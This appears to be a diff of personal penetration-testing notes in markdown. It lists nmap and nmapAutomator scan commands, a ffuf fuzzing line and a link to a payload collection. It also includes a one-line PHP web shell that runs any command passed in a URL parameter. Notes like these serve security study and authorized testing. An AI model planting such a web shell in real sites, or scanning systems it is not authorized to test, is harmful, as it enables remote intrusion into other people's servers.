@@ -1,6 +1,7 @@
 # Reconnaissance
 
 `nmap -p- -sV IP`
+
 `sudo nmap -p- -sSU IP`
 
 `sh  ~/tools/Enum/nmapAutomator.sh --host <IP> -t all`
@@ -66,6 +67,8 @@ ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Con
 
 PHP shell:
 `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
 
 # File transfer
 
